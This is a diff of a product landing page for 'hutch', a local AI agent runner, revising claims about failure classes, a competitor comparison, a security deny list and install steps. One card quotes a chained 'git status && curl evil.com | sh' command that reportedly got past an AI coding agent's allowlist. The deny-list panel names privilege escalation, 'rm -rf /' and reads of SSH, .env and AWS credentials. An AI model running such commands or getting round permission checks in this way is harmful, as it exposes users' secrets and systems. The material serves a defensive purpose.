@@ -21,7 +21,7 @@
       hutch
     </a>
     <div class="nav-links">
-      <a href="#why">Incident Receipts</a>
+      <a href="#why">Failure classes</a>
       <a href="#pillars">Architecture</a>
       <a href="#compare">Compare</a>
       <a href="#safety">Security Manifest</a>
@@ -29,10 +29,6 @@
       <a href="#faq">FAQ</a>
     </div>
     <div class="nav-cta">
-      <a class="github-pill" href="https://github.com/K-Arthur/hutch" target="_blank" rel="noopener">
-        <svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
-        GitHub
-      </a>
       <a class="btn ghost" href="#quickstart">Install Now</a>
       <button class="mobile-menu-btn" id="menu-btn" aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-drawer" aria-expanded="false">
         <svg class="ic" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
@@ -40,7 +36,7 @@
     </div>
   </div>
   <div id="mobile-drawer" class="mobile-drawer" style="display:none;">
-    <a href="#why">Incident Receipts</a>
+    <a href="#why">Failure classes</a>
     <a href="#pillars">Architecture</a>
     <a href="#compare">Compare</a>
     <a href="#safety">Security Manifest</a>
@@ -62,25 +58,25 @@
     </h1>
     
     <p class="hero-sub">
-      Run a fleet of autonomous AI agents on your own computer. Each with its own model, tools,
-      schedule, and isolated workspace. Hard spending caps. DST-safe cron that recovers after sleep.
-      Human approval before anything irreversible. Never rent your intelligence.
+      Named AI bots that live on your own computer. Each has its own model, tools, schedule and workspace.
+      Per-bot token and spend caps, DST-aware cron that catches up after sleep, and a human decision before
+      consequential actions. Early software: Linux first, installed from source.
     </p>
     
     <div class="hero-actions">
       <div class="copy-install-bar">
-        <span>pip install hutch && hutch init</span>
+        <span>pip install -e . && hutch init</span>
         <button class="copy-btn" id="copy-btn">Copy</button>
       </div>
       <a class="btn primary" href="#quickstart">Get Started</a>
-      <a class="btn ghost" href="#why">Read Receipts</a>
+      <a class="btn ghost" href="#why">See the failure classes</a>
     </div>
 
     <div class="hero-guarantees">
-      <span>Linux, macOS, WSL</span>
-      <span>100% offline mock model</span>
-      <span>Ollama, llama.cpp, OpenAI</span>
-      <span>0 telemetry</span>
+      <span>Linux (macOS and Windows not supported yet)</span>
+      <span>Offline mock model included</span>
+      <span>Ollama, llama.cpp, OpenAI-compatible APIs</span>
+      <span>No telemetry in hutch itself</span>
     </div>
 
     <!-- Interactive Agent Studio Simulator -->
@@ -182,24 +178,25 @@
 <!-- ============================================================== WHY -->
 <section id="why">
   <div class="wrap">
-    <div class="section-label">Incident Receipts &middot; Traceability</div>
-    <h2 class="section-heading">Agent products keep failing the exact same ways. We engineered against each one.</h2>
+    <div class="section-label">Failure classes &middot; Traceability</div>
+    <h2 class="section-heading">The failure classes hutch is designed around</h2>
     <p class="section-description">
-      Every safety rule, scheduling invariant, and memory architecture in hutch traces to a verified public incident
-      or top user complaint from 2026 agent deployments.
+      These come from public reports and individual users' accounts in 2026. Most are single reports, not measured
+      prevalence, and we have not reproduced them in the other products. Each card says what hutch does about it
+      today and what it does not do yet. Sources and caveats: <code>docs/research/complaints.md</code>.
     </p>
 
     <div class="incident-log">
       <article class="incident">
         <div class="incident-meta">
           <span class="incident-index">01</span>
-          <span class="incident-stamp">Runaway invoice</span>
-          <span class="incident-source">GitHub bug report &middot; May 2026</span>
+          <span class="incident-stamp">Runaway spend</span>
+          <span class="incident-source">Individual user reports &middot; no single figure verified</span>
         </div>
         <div class="incident-body">
-          <h3>"$447, silently billed overnight"</h3>
-          <blockquote>"A coding-agent user awoke to hundreds of dollars charged by an unmonitored recursive loop. Cloud vendors meter your money and inform you via invoice."</blockquote>
-          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Hard step limits, wall-clock kill switches, and per-bot daily token caps enforced at the engine kernel, not the LLM's courtesy.</span></p>
+          <h3>An unattended loop keeps calling a paid model</h3>
+          <blockquote>People describe agents looping on a paid model while unattended. We could not verify any particular dollar amount, so none is quoted here.</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>What hutch does</b> Step and wall-clock limits per run, a per-bot daily token cap, and spend caps for priced hosted models, all checked by the engine and not left to the model. A token cap is not a currency cap; models without a known price cannot have a spend cap and hutch says so.</span></p>
         </div>
       </article>
 
@@ -207,12 +204,12 @@
         <div class="incident-meta">
           <span class="incident-index">02</span>
           <span class="incident-stamp">Silent failure</span>
-          <span class="incident-source">HN #42749402 &middot; r/n8n</span>
+          <span class="incident-source">HN comments on cron and time zones (26759090, 45727508)</span>
         </div>
         <div class="incident-body">
           <h3>The scheduled run that quietly never happened</h3>
-          <blockquote>"Laptop asleep, DST transition, or daemon crash: scheduled jobs silently vanish while dashboards display deceptive green. Users call it the expensive quiet catastrophe."</blockquote>
-          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Sleep catch-up detects missed intervals and coalesces them into a verified run; IANA-safe cron math prevents double-fires.</span></p>
+          <blockquote>Scheduled work can be lost or doubled when the machine sleeps, the clock changes, or a daemon dies, and a dashboard can still look healthy.</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>What hutch does</b> After sleep it detects missed windows and runs once (or records a visible skip); cron math uses the bot's IANA zone. Limit today: this is safe inside one hutch process; two schedulers sharing one database can still both fire, and that is being fixed.</span></p>
         </div>
       </article>
 
@@ -224,8 +221,8 @@
         </div>
         <div class="incident-body">
           <h3>CLI agent uploaded ~/.ssh and the home directory</h3>
-          <blockquote>"A major CLI agent deterministically uploaded the user's home folder to cloud storage. Another consumer assistant read personal messages and disclosed home addresses."</blockquote>
-          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Isolated workspace path jail with redirected HOME. Critical secrets (<code>~/.ssh</code>, <code>.env</code>, <code>~/.aws</code>) are hard-denied before execution.</span></p>
+          <blockquote>Two widely discussed 2026 reports, by their titles: "Grok CLI uploaded the whole home directory to GCS" and "Meta's New Muse AI Agent Read My Private Messages. I Never Asked It To". They are reports, not findings we verified.</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>What hutch does</b> File tools cannot leave the workspace, commands that name secret paths are denied before they run, and shells start with a redirected HOME. Limit today: that is policy, not an operating-system sandbox. A script a bot writes and runs can still read files your user can read. OS containment is being built.</span></p>
         </div>
       </article>
 
@@ -237,21 +234,21 @@
         </div>
         <div class="incident-body">
           <h3>Relentless nagging ends in YOLO-mode bypasses</h3>
-          <blockquote>"Agents nag until developers switch on <code>--dangerously-skip-permissions</code>. Chained commands like <code>git status &amp;&amp; curl evil | sh</code> bypassed allowlists for a year."</blockquote>
-          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Sticky allows you grant once and can revoke anytime. Compound-command parser decomposes chains and enforces worst-verdict-wins.</span></p>
+          <blockquote>Commenters describe turning on <code>--dangerously-skip-permissions</code> to escape constant prompts, and one hook author reports that allowing <code>git status</code> also auto-approved <code>git status &amp;&amp; curl evil.com | sh</code> in Claude Code.</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>What hutch does</b> Ask once and optionally remember a narrow rule you can list and revoke. Command lines are split into every place a command can hide and the worst verdict wins. Hard-denied classes never become allowed by a remembered rule.</span></p>
         </div>
       </article>
 
       <article class="incident">
         <div class="incident-meta">
           <span class="incident-index">05</span>
-          <span class="incident-stamp">Zero restrictions</span>
-          <span class="incident-source">HN #49954346 &middot; OpenClaw post-mortem</span>
+          <span class="incident-stamp">Orphaned work</span>
+          <span class="incident-source">OpenClaw issue 138499 &middot; open, one reporter, not reproduced by us</span>
         </div>
         <div class="incident-body">
-          <h3>The unconstrained local agent hazard</h3>
-          <blockquote>"Open-source tools like OpenClaw shipped with zero out-of-the-box restrictions, allowing models to mutate disk unchecked and lose memory in messy markdown files."</blockquote>
-          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Strict default least-privilege, structured SQLite memory you can inspect and purge, and zero ambient shell permissions.</span></p>
+          <h3>A timed-out scheduled task leaves its child process running</h3>
+          <blockquote>One reporter says a cron task that timed out left its background command marked running for more than five hours. It is an open issue with an open fix.</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>What hutch does</b> Honest status: hutch has had the same weakness. A run that timed out was marked finished while its worker thread kept going. Owned worker processes with verified teardown are being built; progress is in <code>docs/realignment/ledger.md</code>.</span></p>
         </div>
       </article>
     </div>
@@ -263,20 +260,20 @@
     <div class="section-label">Architecture &middot; Bento Grid</div>
     <h2 class="section-heading">Engineered for absolute local reliability</h2>
     <p class="section-description">
-      The agent prompt loop is simple. hutch is the hardened operational plumbing around it:
-      sandboxing, scheduling, approvals, budgets, and append-only audits.
+      The agent prompt loop is simple. hutch is the operational plumbing around it:
+      policy checks, scheduling, approvals, budgets, and an audit trail. Each card lists what is still missing.
     </p>
 
     <div class="bento-grid">
       <div class="bento-card">
-        <span class="bento-tag">SECURITY &amp; SANDBOX</span>
-        <h3>Workspace Jail &amp; Policy Engine</h3>
-        <p>No ambient authority. Every bot operates strictly within its designated disk perimeter.</p>
+        <span class="bento-tag">POLICY &amp; PATH JAIL</span>
+        <h3>Policy Engine &amp; Workspace Path Jail</h3>
+        <p>A policy layer checks every tool call before it runs. It is a safeguard against mistakes, not an operating-system sandbox.</p>
         <ul class="bento-list">
-          <li><b>Path containment:</b> Tools cannot resolve paths outside the run workspace.</li>
-          <li><b>Environment scrub:</b> Shell commands run with synthetic HOME and sanitized env vars.</li>
-          <li><b>Compound-command aware:</b> Parses <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, <code>|</code> to prevent chained injection bypasses.</li>
-          <li><b>Public-only egress:</b> Web fetches blocked from localhost, internal subnets, and cloud metadata IPs.</li>
+          <li><b>Path containment:</b> File tools cannot resolve paths outside the workspace.</li>
+          <li><b>Environment scrub:</b> Shell commands run with a synthetic HOME and a minimal environment.</li>
+          <li><b>Compound-command aware:</b> Splits chained commands, pipes, substitutions and wrappers and applies the worst verdict.</li>
+          <li><b>Not yet:</b> OS-level containment of the shell, and DNS/redirect-aware fetch checks. Both are in progress; until then a bot's script can read files your user can.</li>
         </ul>
       </div>
 
@@ -287,7 +284,7 @@
         <ul class="bento-list">
           <li><b>Sleep catch-up:</b> Detects missed schedule intervals and coalesces them cleanly into one run.</li>
           <li><b>DST &amp; Timezone safe:</b> Explicit IANA timezone handling eliminates duplicate fires and missed hours.</li>
-          <li><b>Single-instance locks:</b> Per-bot mutexes guarantee scheduled tasks never clobber each other.</li>
+          <li><b>One run per bot:</b> A bot never overlaps itself inside one hutch process. Cross-process claims are in progress.</li>
           <li><b>Staleness monitors:</b> Flags bots whose last success timestamp exceeds their schedule expectation.</li>
         </ul>
       </div>
@@ -297,22 +294,22 @@
         <h3>Kind Approvals &middot; Fail-Closed</h3>
         <p>Supervision that respects developer time without compromising safety.</p>
         <ul class="bento-list">
-          <li><b>Fail-closed TTL:</b> Unanswered approval requests expire as <b>denied</b> after 10 minutes.</li>
+          <li><b>Fail-closed TTL:</b> Unanswered approval requests expire as denied after 10 minutes.</li>
           <li><b>Sticky allows:</b> Tick "always allow" once per bot; revoke anytime in the Studio inspector.</li>
-          <li><b>Browser CAPTCHA pauses:</b> Playwright browser pauses for a human at MFA/CAPTCHA walls instead of guessing.</li>
-          <li><b>Persistent logins:</b> Chromium profiles persist per bot so repetitive logins are eliminated.</li>
+          <li><b>Browser pauses (experimental):</b> The run parks in a "needs you" state at a login or CAPTCHA wall instead of guessing. A visible handoff session is in progress.</li>
+          <li><b>Persistent logins (experimental):</b> Chromium profiles persist per bot. Optional Playwright extra, untested on this release without browsers installed.</li>
         </ul>
       </div>
 
       <div class="bento-card">
         <span class="bento-tag">LOCAL SOVEREIGNTY</span>
         <h3>Transcripts, Budgets &amp; Pluggable Runtimes</h3>
-        <p>Everything lives in one directory on your disk. Complete control, zero lock-in.</p>
+        <p>Everything lives in one directory on your disk, in files you can inspect, back up or delete.</p>
         <ul class="bento-list">
-          <li><b>Append-only transcripts:</b> Every prompt, tool call, output, and token count stored in SQLite + JSONL.</li>
-          <li><b>Hard spending caps:</b> Max steps, execution timeout, and daily token quotas per bot.</li>
-          <li><b>Model agnostic:</b> Connect to Ollama, llama.cpp, LM Studio, OpenAI, or run offline on our mock runtime.</li>
-          <li><b>Pluggable harnesses:</b> Default ~300 line auditable loop, or delegate bots to Pi / OpenCode.</li>
+          <li><b>Transcripts:</b> Prompts, tool calls, outputs and token counts are written to SQLite and a JSONL mirror with a hash chain.</li>
+          <li><b>Caps:</b> Max steps, wall-clock timeout and daily token quota per bot; spend caps for priced hosted models.</li>
+          <li><b>Model choice:</b> Ollama, llama.cpp, LM Studio, OpenAI-compatible and Anthropic endpoints, or the offline mock runtime. Tested against recorded fakes; live runs depend on your setup.</li>
+          <li><b>Other harnesses (experimental):</b> The built-in agent loop by default, or delegate a bot to Pi or OpenCode. Those run with their own tools, outside hutch's policy gate.</li>
         </ul>
       </div>
     </div>
@@ -323,10 +320,11 @@
 <section id="compare">
   <div class="wrap">
     <div class="section-label">Honest Comparison</div>
-    <h2 class="section-heading">Cloud agents are impressive. They are also not yours.</h2>
+    <h2 class="section-heading">Hosted agent computers and a local one are different trade-offs</h2>
     <p class="section-description">
-      OpenAI Dots, Grok Team Bots, Meta Muse, and OpenClaw pushed personal agents mainstream in 2026.
-      Here is how hutch stands apart on sovereignty, budgets, and safety.
+      OpenAI dots and Grok Bot give each agent a computer in their cloud. hutch runs on yours. Neither is better
+      for everyone. Statements about other products are taken from their own documentation, read on 2026-10-07
+      (<code>docs/realignment/evidence-ledger.md</code>); anything we could not read is left out.
     </p>
 
     <div class="matrix-wrapper">
@@ -335,84 +333,58 @@
           <tr>
             <th>Feature</th>
             <th class="matrix-hutch">hutch</th>
-            <th>OpenAI Dots</th>
-            <th>Grok Team Bots</th>
-            <th>Meta Muse</th>
-            <th>OPENCLAW</th>
+            <th>OpenAI dots</th>
+            <th>Grok Bot</th>
           </tr>
         </thead>
         <tbody>
           <tr>
-            <td data-label="Feature">Execution Location</td>
+            <td data-label="Feature">Where the computer runs</td>
             <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Your machine</span></td>
-            <td data-label="OpenAI Dots">OpenAI Cloud</td>
-            <td data-label="Grok Team Bots">xAI Cloud</td>
-            <td data-label="Meta Muse">Meta Cloud</td>
-            <td data-label="OPENCLAW"><span class="pill-check yes">Local</span></td>
+            <td data-label="OpenAI dots">Its own cloud computer; one personal computer can also be connected while the app is open</td>
+            <td data-label="Grok Bot">A cloud computer ("lives in the cloud")</td>
           </tr>
           <tr>
-            <td data-label="Feature">Model Freedom</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Any local or hosted</span></td>
-            <td data-label="OpenAI Dots"><span class="pill-check no">GPT only</span></td>
-            <td data-label="Grok Team Bots"><span class="pill-check no">Grok only</span></td>
-            <td data-label="Meta Muse"><span class="pill-check no">Muse only</span></td>
-            <td data-label="OPENCLAW"><span class="pill-check yes">Any model</span></td>
+            <td data-label="Feature">Works while your laptop sleeps</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check no">No. Work queues until the machine is awake</span></td>
+            <td data-label="OpenAI dots">Cloud work can continue while devices are off</td>
+            <td data-label="Grok Bot">Yes, because the computer is in the cloud</td>
           </tr>
           <tr>
-            <td data-label="Feature">Works 100% Offline</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Free mock model</span></td>
-            <td data-label="OpenAI Dots"><span class="pill-check no">No</span></td>
-            <td data-label="Grok Team Bots"><span class="pill-check no">No</span></td>
-            <td data-label="Meta Muse"><span class="pill-check no">No</span></td>
-            <td data-label="OPENCLAW"><span class="pill-check yes">Yes</span></td>
+            <td data-label="Feature">Human takeover</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check maybe">Run parks in a "needs you" state; visible handoff in progress</span></td>
+            <td data-label="OpenAI dots">"Take over" and "Return control"</td>
+            <td data-label="Grok Bot">Hands the desktop back for CAPTCHA or 2FA</td>
           </tr>
           <tr>
-            <td data-label="Feature">Hard Spend &amp; Step Caps</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Per bot, per day</span></td>
-            <td data-label="OpenAI Dots"><span class="pill-check no">Plan limits only</span></td>
-            <td data-label="Grok Team Bots"><span class="pill-check no">Plan limits only</span></td>
-            <td data-label="Meta Muse"><span class="pill-check no">Plan limits only</span></td>
-            <td data-label="OPENCLAW"><span class="pill-check no">None (unlimited)</span></td>
+            <td data-label="Feature">Models</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Local (Ollama) or hosted endpoints you configure</span></td>
+            <td data-label="OpenAI dots">Powered by OpenAI models</td>
+            <td data-label="Grok Bot">Not documented on the pages we read</td>
           </tr>
           <tr>
-            <td data-label="Feature">Sleep Catch-Up Cron</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Coalesce missed</span></td>
-            <td data-label="OpenAI Dots"><span class="pill-check maybe">Cloud cron</span></td>
-            <td data-label="Grok Team Bots"><span class="pill-check maybe">Cloud cron</span></td>
-            <td data-label="Meta Muse"><span class="pill-check maybe">Background</span></td>
-            <td data-label="OPENCLAW"><span class="pill-check no">None</span></td>
+            <td data-label="Feature">Where data goes</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check maybe">Stays local with a local model; a hosted model or web tool receives what you send it</span></td>
+            <td data-label="OpenAI dots">Processed in OpenAI's cloud</td>
+            <td data-label="Grok Bot">Processed in the vendor's cloud</td>
           </tr>
           <tr>
-            <td data-label="Feature">Human Approval Gates</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Fail-closed 10m TTL</span></td>
-            <td data-label="OpenAI Dots"><span class="pill-check maybe">Basic prompt</span></td>
-            <td data-label="Grok Team Bots"><span class="pill-check maybe">Slack prompt</span></td>
-            <td data-label="Meta Muse"><span class="pill-check maybe">Periodic check</span></td>
-            <td data-label="OPENCLAW"><span class="pill-check no">Zero guardrails</span></td>
+            <td data-label="Feature">Approvals and limits</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Per-action approval, expire as denied; step, time and token caps</span></td>
+            <td data-label="OpenAI dots">Reviews drafts; plan allowance</td>
+            <td data-label="Grok Bot">Natural-language rules and a review agent; no numeric limits documented</td>
           </tr>
           <tr>
-            <td data-label="Feature">Workspace Path Jail</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Strict sandboxing</span></td>
-            <td data-label="OpenAI Dots"><span class="pill-check maybe">Cloud VM</span></td>
-            <td data-label="Grok Team Bots"><span class="pill-check no">Home folder leaks</span></td>
-            <td data-label="Meta Muse"><span class="pill-check no">Full access</span></td>
-            <td data-label="OPENCLAW"><span class="pill-check no">Zero isolation</span></td>
+            <td data-label="Feature">Phone access</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check no">Not yet. Paired web supervision is planned</span></td>
+            <td data-label="OpenAI dots">Mobile app and other channels</td>
+            <td data-label="Grok Bot">Phone or desktop</td>
           </tr>
           <tr>
-            <td data-label="Feature">Full SQLite Transcripts</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Plain files on disk</span></td>
-            <td data-label="OpenAI Dots"><span class="pill-check no">In-app only</span></td>
-            <td data-label="Grok Team Bots"><span class="pill-check no">In-app only</span></td>
-            <td data-label="Meta Muse"><span class="pill-check no">In-app only</span></td>
-            <td data-label="OPENCLAW"><span class="pill-check maybe">Flat markdown</span></td>
-          </tr>
-          <tr>
-            <td data-label="Feature">Price &amp; Licensing</td>
-            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Free &middot; MIT</span></td>
-            <td data-label="OpenAI Dots">$20+/mo Subscription</td>
-            <td data-label="Grok Team Bots">SuperGrok Tier</td>
-            <td data-label="Meta Muse">Paid tier limits</td>
-            <td data-label="OPENCLAW"><span class="pill-check yes">MIT</span></td>
+            <td data-label="Feature">Cost and licence</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Software is MIT. You pay for any hosted inference and your own hardware</span></td>
+            <td data-label="OpenAI dots">Included with eligible plans (Pro, Business, Enterprise); allowances apply</td>
+            <td data-label="Grok Bot">Free start and enterprise contact shown; no tiers listed</td>
           </tr>
         </tbody>
       </table>
@@ -426,8 +398,9 @@
     <div class="section-label">Security Manifest</div>
     <h2 class="section-heading">Deny by class. Ask by default. Record everything.</h2>
     <p class="section-description">
-      A transparent policy engine evaluates every action before it executes.
-      Risky actions require human consent; destructive classes never execute under any circumstances.
+      A policy engine evaluates every tool call before it executes. Risky actions need a human decision and the
+      classes below are refused outright. This is a safeguard for supervised use, not a security boundary against
+      a determined attacker; see the safety model for its limits.
     </p>
 
     <div class="term">
@@ -436,7 +409,7 @@
         <button class="term-tab" role="tab" id="tab-compound" aria-controls="panel-compound" aria-selected="false" tabindex="-1">Compound command parser</button>
       </div>
 
-      <div class="term-body" role="tabpanel" id="panel-deny" aria-labelledby="tab-deny"><pre><span class="t-c"># hard-denied at the policy layer, before execution, always</span>
+      <div class="term-body" role="tabpanel" id="panel-deny" aria-labelledby="tab-deny"><pre><span class="t-c"># refused by the policy layer before execution, whatever a remembered rule says</span>
 <span class="t-p">$</span> sudo / su / doas                  <span class="t-c">agents never escalate privileges</span>
 <span class="t-p">$</span> rm -rf / &middot; ~ &middot; ..                <span class="t-c">deletions outside the workspace</span>
 <span class="t-p">$</span> cat ~/.ssh/* &middot; .env &middot; ~/.aws     <span class="t-c">secret and credential paths</span>
@@ -458,8 +431,8 @@
     <div class="section-label">Quickstart</div>
     <h2 class="section-heading">Two minutes to your first supervised bot</h2>
     <p class="section-description">
-      The included mock model runs the entire platform offline without API keys or accounts.
-      Switch to Ollama or OpenAI whenever you are ready.
+      hutch is not published yet. The repository is private and there is no PyPI release, so install from a source
+      checkout you have been given. The included mock model runs the whole pipeline offline without API keys.
     </p>
 
     <div class="term">
@@ -469,8 +442,8 @@
         <button class="term-tab" role="tab" id="tab-pipx" aria-controls="panel-pipx" aria-selected="false" tabindex="-1">pipx</button>
       </div>
 
-      <div class="term-body" role="tabpanel" id="panel-pip" aria-labelledby="tab-pip"><pre><span class="t-c"># 1. install from a clone</span>
-<span class="t-p">$</span> git clone https://github.com/K-Arthur/hutch &amp;&amp; cd hutch
+      <div class="term-body" role="tabpanel" id="panel-pip" aria-labelledby="tab-pip"><pre><span class="t-c"># 1. install from a source checkout (Python 3.11+, Linux)</span>
+<span class="t-p">$</span> cd hutch
 <span class="t-p">$</span> pip install -e .
 
 <span class="t-c"># 2. state directory + 3 starter bots (mock model, no API key)</span>
@@ -485,8 +458,8 @@
 <span class="t-c"># 5. headless daemon: cron, catch-up, approval expiry</span>
 <span class="t-p">$</span> hutch daemon</pre></div>
 
-      <div class="term-body" role="tabpanel" id="panel-uv" aria-labelledby="tab-uv" hidden><pre><span class="t-c"># 1. install from a clone</span>
-<span class="t-p">$</span> git clone https://github.com/K-Arthur/hutch &amp;&amp; cd hutch
+      <div class="term-body" role="tabpanel" id="panel-uv" aria-labelledby="tab-uv" hidden><pre><span class="t-c"># 1. install from a source checkout (Python 3.11+, Linux)</span>
+<span class="t-p">$</span> cd hutch
 <span class="t-p">$</span> uv venv &amp;&amp; uv pip install -e .
 
 <span class="t-c"># 2. state directory + 3 starter bots (mock model, no API key)</span>
@@ -501,8 +474,8 @@
 <span class="t-c"># 5. headless daemon: cron, catch-up, approval expiry</span>
 <span class="t-p">$</span> uv run hutch daemon</pre></div>
 
-      <div class="term-body" role="tabpanel" id="panel-pipx" aria-labelledby="tab-pipx" hidden><pre><span class="t-c"># 1. install isolated, from the repo</span>
-<span class="t-p">$</span> pipx install git+https://github.com/K-Arthur/hutch
+      <div class="term-body" role="tabpanel" id="panel-pipx" aria-labelledby="tab-pipx" hidden><pre><span class="t-c"># 1. install isolated, from a source checkout</span>
+<span class="t-p">$</span> pipx install ./hutch
 
 <span class="t-c"># 2. state directory + 3 starter bots (mock model, no API key)</span>
 <span class="t-p">$</span> hutch init
@@ -531,12 +504,12 @@
 
       <details class="faq-item">
           <summary>Does hutch phone home or send telemetry?</summary>
-          <p>No. Zero telemetry, zero phone-home, zero accounts, and zero analytics. Everything lives inside <code>~/.local/state/hutch</code> on your disk in SQLite and JSONL files you can inspect, back up, or delete.</p>
+          <p>hutch itself sends no telemetry and has no accounts; we searched the source for analytics and phone-home code and found none. Your data still leaves the machine whenever you configure something that sends it: a hosted model receives the conversation, and <code>web_fetch</code> and the browser contact the sites you point them at. With a local model and no web tools, nothing is sent. State lives in <code>~/.local/state/hutch</code> as SQLite and JSONL files you can inspect, back up or delete.</p>
         </details>
 
       <details class="faq-item">
-          <summary>How does hutch differ from OpenClaw?</summary>
-          <p>OpenClaw provided a lightweight local agent but shipped with zero out-of-the-box guardrails, ambient shell authority, and flat markdown memory that suffered desync. hutch provides isolated workspace path jails, sticky human-in-the-loop approvals, structured SQLite memory you can inspect, and hard token budget caps.</p>
+          <summary>How is hutch different from dots and Grok Bot?</summary>
+          <p>Those products give each agent a computer in the vendor's cloud, which is why they keep working while your devices are off and can be reached from a phone. hutch runs on your own machine with models you choose, so your files stay put and you hold the keys, but it stops when the machine sleeps and it does not yet offer phone supervision. It is also much younger and has fewer integrations.</p>
         </details>
 
       <details class="faq-item">
@@ -546,7 +519,7 @@
 
       <details class="faq-item">
           <summary>What happens when a browser bot hits a CAPTCHA or MFA wall?</summary>
-          <p>hutch emits a pause-to-human event and waits for you. Bots never hallucinate clicks on verification walls or try to solve CAPTCHAs. Because Chromium profiles persist per bot, logins survive between runs.</p>
+          <p>The run moves to a "needs you" state and waits; hutch never tries to solve a CAPTCHA. Browser support is experimental: it needs the optional Playwright extra, and showing you the page to complete the step (a visible handoff) is still being built. Chromium profiles persist per bot so a login can survive between runs.</p>
         </details>
     </div>
   </div>
@@ -555,11 +528,10 @@
 <!-- =============================================================== CTA -->
 <section class="bottom-cta">
   <div class="wrap">
-    <h2>Stop renting your agents.</h2>
-    <p>Open source, local-first, and answerable to you &mdash; not a monthly subscription tier.</p>
+    <h2>Bots that run where your files are.</h2>
+    <p>MIT-licensed, local-first, and still early. Not yet published; ask for a source checkout.</p>
     <div style="display:flex;gap:14px;justify-content:center;flex-wrap:wrap;">
-      <a class="btn primary" href="#quickstart">Install hutch</a>
-      <a class="btn ghost" href="https://github.com/K-Arthur/hutch" target="_blank" rel="noopener">Read the Source on GitHub</a>
+      <a class="btn primary" href="#quickstart">Install from source</a>
     </div>
   </div>
 </section>
@@ -576,15 +548,14 @@
         hutch
       </div>
       <div class="footer-nav">
-        <a href="#why">Receipts</a>
+        <a href="#why">Failure classes</a>
         <a href="#pillars">Architecture</a>
         <a href="#compare">Compare</a>
         <a href="#safety">Security</a>
-        <a href="https://github.com/K-Arthur/hutch" target="_blank" rel="noopener">GitHub</a>
       </div>
     </div>
     <div style="margin-top:22px;color:var(--text-dim);font-size:12px;">
-      MIT Licensed &middot; Built because agents deserve better plumbing &middot; Competitor citations are verifiable from public bug trackers and community reports, Oct 2026.
+      MIT Licensed &middot; Statements about other products come from their own documentation read on 2026-10-07; reports from individual users are labelled as such.
     </div>
   </div>
 </footer>
@@ -618,7 +589,7 @@ if (simApproveBtn && simApprovalBox && simCompletedLog) {
 const copyBtn = document.getElementById('copy-btn');
 if (copyBtn) {
   copyBtn.addEventListener('click', () => {
-    navigator.clipboard.writeText('pip install hutch && hutch init');
+    navigator.clipboard.writeText('pip install -e . && hutch init');
     copyBtn.textContent = 'Copied!';
     setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000);
   });
